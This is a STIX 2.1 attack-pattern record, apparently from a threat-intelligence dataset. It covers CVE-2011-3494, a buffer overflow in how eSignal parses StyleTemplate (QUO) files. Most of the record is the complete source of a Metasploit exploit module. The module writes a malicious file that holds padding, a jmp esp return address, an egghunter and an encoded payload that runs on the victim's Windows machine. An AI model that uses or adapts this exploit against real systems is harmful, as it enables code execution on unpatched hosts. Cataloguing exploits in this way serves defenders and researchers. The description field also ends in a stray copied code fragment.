{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--56fb880d-7ae4-4197-8e7f-0b7bf4219cd1",
    "created": "2024-08-14T16:37:55.443336Z",
    "modified": "2024-08-14T16:37:55.44334Z",
    "name": "eSignal and eSignal Pro File Parsing Buffer Overflow in QUO",
    "description": " The software is unable to handle the \"<StyleTemplate>\" files (even those original included in the program) like those with the registered extensions QUO, SUM and POR. Successful exploitation of this vulnerability may take up to several seconds due to the use of egghunter. Also, DEP bypass is unlikely due to the limited space for payload. This vulnerability affects versions 10.6.2425.1208 and earlier.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/esignal_styletemplate_bof.rb",
            "external_id": "esignal_styletemplate_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-3494"
        },
        {
            "source_name": "reference",
            "url": "http://aluigi.altervista.org/adv/esignal_1-adv.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'eSignal and eSignal Pro File Parsing Buffer Overflow in QUO',\n      'Description'    => %q{\n        The software is unable to handle the \"<StyleTemplate>\" files (even those\n        original included in the program) like those with the registered\n        extensions QUO, SUM and POR. Successful exploitation of this\n        vulnerability may take up to several seconds due to the use of\n        egghunter. Also, DEP bypass is unlikely due to the limited space for\n        payload. This vulnerability affects versions 10.6.2425.1208 and earlier.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Luigi Auriemma',                          # Original discovery\n          'TecR0c <tecr0c[at]tecninja.net>',         # msf\n          'mr_me <steventhomasseeley[at]gmai.com>',  # msf\n        ],\n      'References'    =>\n        [\n          [ 'CVE', '2011-3494' ],\n          [ 'OSVDB', '75456' ],\n          [ 'BID', '49600' ],\n          [ 'URL', 'http://aluigi.altervista.org/adv/esignal_1-adv.txt' ],\n          [ 'EDB', '17837' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\"\n        },\n\n      'Targets'        =>\n        [\n          [\n            'Win XP SP3 / Windows Vista / Windows 7',\n            {\n              'Ret'     =>  0x7c206fef, # jmp esp MFC71.dll v10.6.2425.1208\n              'Offset'  =>  54\n            }\n          ],\n        ],\n      'Privileged'\t => false,\n      'DisclosureDate' => '2011-09-06',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ false, 'The file name.', 'msf.quo']),\n      ])\n\n  end\n\n  def exploit\n    eggoptions =\n    {\n      :checksum => false,\n      :eggtag => 'eggz'\n    }\n\n    hunter,egg = generate_egghunter(payload.encoded, payload_badchars, eggoptions)\n\n    buffer =  rand_text_alpha(target['Offset'])\n    buffer << [target.ret].pack('V')\n    buffer << rand_text_alpha_upper(4)\n    buffer << hunter\n    buffer << rand_text_alpha_upper(1500)\n    buffer << egg\n\n    file = \"<StyleTemplate>\\r\\n\"\n    file << \"#{buffer}\\r\\n\"\n    file << \"</StyleTemplate>\\r\\n\"\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    file_create(file)\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-09-06",
    "x_mitre_platforms": [
        "win'"
    ]
}